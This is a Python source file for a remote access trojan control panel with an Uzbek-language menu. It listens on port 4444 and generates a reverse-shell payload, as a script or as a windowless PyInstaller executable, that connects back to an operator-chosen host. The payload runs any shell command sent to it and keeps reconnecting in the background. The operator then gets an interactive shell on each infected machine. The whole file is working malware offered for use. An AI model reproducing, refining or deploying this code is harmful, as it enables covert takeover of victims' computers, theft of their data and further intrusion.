import socket
import os
import threading
import time
import sys
import shutil
import subprocess

SERVER_HOST = "0.0.0.0" 
DISPLAY_HOST = "127.0.0.1" 
PORT = 4444
active_clients = {} 
client_counter = 0
is_server_running = False
server_socket = None

R, G, C, Y, W = '\033[31m', '\033[32m', '\033[36m', '\033[33m', '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

CLIENT_CODE_TEMPLATE = r"""
import socket
import subprocess
import os
import time
import sys

HOST = "{HOST}"
PORT = {PORT}
HEADER_SIZE = 10
BUFFER_SIZE = 4096

def s_data(s, d):
    try:
        if isinstance(d, str): d = d.encode('utf-8')
        l = str(len(d)).zfill(HEADER_SIZE)
        s.sendall(l.encode('utf-8') + d)
    except: pass

def r_data(s):
    try:
        h = s.recv(HEADER_SIZE)
        if not h: return None
        l = int(h.decode('utf-8').strip())
        d = b''
        while len(d) < l:
            c = s.recv(min(l - len(d), BUFFER_SIZE))
            if not c: return None
            d += c
        return d.decode('utf-8', errors='ignore')
    except: return None

def run():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            
            while True:
                try: cwd = os.getcwd()
                except: cwd = "UNKNOWN"
                s_data(s, cwd)
                
                cmd = r_data(s)
                if not cmd: break
                
                if cmd.lower() in ['exit', 'q']: break
                
                if cmd.lower().startswith('cd '):
                    try: 
                        os.chdir(cmd[3:].strip())
                        r = " "
                    except Exception as e: r = str(e)
                else:
                    try:
                        si = None
                        if os.name == 'nt':
                            si = subprocess.STARTUPINFO()
                            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                            
                        res = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True, startupinfo=si)
                        try: r = res.decode('utf-8')
                        except: r = res.decode('cp866', errors='ignore')
                    except subprocess.CalledProcessError as e:
                        try: r = e.output.decode('cp866', errors='ignore')
                        except: r = str(e)
                    except Exception as e: r = str(e)
                
                if not r: r = " "
                s_data(s, r)
                
        except: pass
        finally:
            s.close()
            time.sleep(5)

if __name__ == "__main__":
    run()
"""
def get_banner():
    return f"""{C}
╔══════════════════════════════════════════════════════════╗
║               ADVANCED RAT CONTROL PANEL                 ║
╠══════════════════════════════════════════════════════════╣
║ {G}Author  : @Xorazmlik_2004                                {C}║
║ {Y}Version : TEST v1                                        {C}║
╚══════════════════════════════════════════════════════════╝{W}
"""

def print_table(headers, rows):
    if not rows:
        print(f"{Y}[!] Hozirda ulangan qurilmalar yo'q.{W}")
        return
    widths = [len(h) for h in headers]
    for row in rows:
        for i, val in enumerate(row):
            clean_val = str(val).replace(G, '').replace(R, '').replace(W, '')
            widths[i] = max(widths[i], len(clean_val))
    widths = [w + 2 for w in widths]
    row_format = " | ".join([f"{{:<{w}}}" for w in widths])
    line = "-" * (sum(widths) + 3 * (len(headers) - 1))
    
    print(f"\n{C}{line}")
    print(row_format.format(*headers))
    print(f"{line}{W}")
    for row in rows:
        print(row_format.format(*[str(r) for r in row]))
    print(f"{C}{line}{W}")

def send_data(conn, data):
    try:
        if isinstance(data, str): data = data.encode('utf-8')
        header = str(len(data)).zfill(10).encode('utf-8')
        conn.sendall(header + data)
    except: pass

def recv_data(conn):
    try:
        h = conn.recv(10)
        if not h: return None
        l = int(h.decode('utf-8').strip())
        d = b''
        while len(d) < l:
            c = conn.recv(min(l - len(d), 4096))
            if not c: return None
            d += c
        return d.decode('utf-8', errors='ignore')
    except: return None

def handle_client(conn, addr, cid):
    global active_clients
    try:
        while True: time.sleep(1)
    except: pass
    finally:
        conn.close()
        if cid in active_clients: del active_clients[cid]

def start_server_thread():
    global server_socket, is_server_running, client_counter
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((SERVER_HOST, PORT))
        server_socket.listen(10)
        is_server_running = True
        while is_server_running:
            try:
                conn, addr = server_socket.accept()
                client_counter += 1
                t = threading.Thread(target=handle_client, args=(conn, addr, client_counter))
                t.daemon = True
                active_clients[client_counter] = (conn, addr, t)
            except: break
    except: is_server_running = False
def generate_payload(file_type):
    global DISPLAY_HOST, PORT
    print(f"\n{C}[*] Payload yaratilmoqda...{W}")
    print(f"    Host: {DISPLAY_HOST} | Port: {PORT}")
    
    final_code = CLIENT_CODE_TEMPLATE.replace("{HOST}", DISPLAY_HOST).replace("{PORT}", str(PORT))
    
    filename = "payload.py"
    with open(filename, "w") as f: f.write(final_code)
    
    if file_type == 'py':
        print(f"{G}[+] 'payload.py' muvaffaqiyatli yaratildi!{W}")
    elif file_type == 'exe':
        if shutil.which("pyinstaller") is None:
            print(f"{R}[-] PyInstaller o'rnatilmagan! (pip install pyinstaller){W}")
            return
        
        print(f"{Y}[*] EXE ga aylantirish boshlandi (Silent Mode)...{W}")
        try:
            subprocess.check_call(f'pyinstaller --noconsole --onefile {filename}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            print(f"{G}[+] Tayyor! Fayl: 'dist/payload.exe'{W}")
            try:
                os.remove("payload.py"); os.remove("payload.spec"); shutil.rmtree("build")
            except: pass
        except Exception as e: print(f"{R}[-] Xatolik: {e}{W}")
def interact_session(cid):
    if cid not in active_clients:
        print(f"{R}[-] Bunday ID mavjud emas.{W}")
        time.sleep(1); return

    conn, addr, _ = active_clients[cid]
    clear_screen()
    print(f"{G}[+] {addr} bilan aloqa o'rnatildi.{W}")
    print(f"{Y}[!] Chiqish uchun 'exit', orqaga qaytish uchun 'background'.{W}\n")

    cwd = None
    conn.settimeout(1.0)
    try:
        cwd = recv_data(conn)
    except socket.timeout:
        pass
    except:
        print(f"{R}[!] Aloqa uzildi.{W}"); return
    conn.settimeout(None)

    if cwd is None:
        print(f"{Y}[*] Sinxronizatsiya qilinmoqda...{W}")
        send_data(conn, "echo sync")
        _ = recv_data(conn)
        cwd = recv_data(conn)

    while True:
        if not cwd: break
        
        cmd = input(f"{C}Shell#{cid} [{cwd}]> {W}").strip()
        
        if not cmd:
            send_data(conn, " ")
            _ = recv_data(conn)
            continue

        if cmd.lower() == 'background': break
        if cmd.lower() == 'exit':
            send_data(conn, 'exit')
            del active_clients[cid]
            break

        send_data(conn, cmd)
        
        result = recv_data(conn)
        if result and result.strip(): print(result)
        cwd = recv_data(conn)
def main_menu():
    global SERVER_HOST, PORT, DISPLAY_HOST, is_server_running
    
    while True:
        clear_screen()
        print(get_banner())
        status = f"{G}ON{W}" if is_server_running else f"{R}OFF{W}"

        print(f"    Server: [{status}]  |  Port: {PORT}")
        
        print(f"    Payload IP: {C}{DISPLAY_HOST}{W}")
        
        print("\n╔════════════════════════════════════════╗")
        print("║ 1. Sozlamalar (IP/Port)                ║")
        print("║ 2. Serverni Ishga Tushirish            ║")
        print("║ 3. Payload Yaratish (.py - Script)     ║")
        print("║ 4. Payload Yaratish (.exe - Dastur)    ║")
        print("║ 5. Ulanganlar Ro'yxati                 ║")
        print("║ 6. Boshqarish (Select ID)              ║")
        print("║ 7. Chiqish                             ║")
        print("╚════════════════════════════════════════╝")
        
        choice = input(f"\n{C}>> Tanlang: {W}").strip()

        if choice == '1':
            print(f"\n{Y}[*] Sozlamalar:{W}")
            h = input(f"Host IP [{DISPLAY_HOST}]: ").strip()
            p = input(f"Port [{PORT}]: ").strip()
            if h: DISPLAY_HOST = h
            if p: PORT = int(p)
            print(f"{G}[+] Saqlandi.{W}")
            input("\n[Enter]...")

        elif choice == '2':
            if not is_server_running:
                t = threading.Thread(target=start_server_thread); t.daemon = True; t.start()
                time.sleep(1)
                print(f"\n{G}[+] Server ishga tushdi (0.0.0.0:{PORT}){W}")
            else:
                print(f"\n{Y}[!] Server allaqachon ishlayapti.{W}")
            input("\n[Enter]...")

        elif choice == '3': 
            generate_payload('py')
            input("\n[Enter]...")

        elif choice == '4': 
            generate_payload('exe')
            input("\n[Enter]...")

        elif choice == '5':
            rows = []
            for k in list(active_clients.keys()):
                try: rows.append([str(k), active_clients[k][1][0], "On"])
                except: pass
            print_table(["ID", "IP Manzil", "Holati"], rows)
            input("\n[Enter]...")

        elif choice == '6':
            try:
                print(f"\n{C}Mavjud IDlar: {list(active_clients.keys())}{W}")
                tid = int(input("ID raqamini kiriting: "))
                interact_session(tid)
            except ValueError:
                print(f"{R}[!] Iltimos, raqam kiriting.{W}"); time.sleep(1)
            except Exception as e:
                 print(f"{R}[!] Xato: {e}{W}"); time.sleep(1)

        elif choice == '7':
            print(f"\n{Y}Dastur to'xtatilmoqda...{W}")
            os._exit(0)

if __name__ == "__main__":
    main_menu()
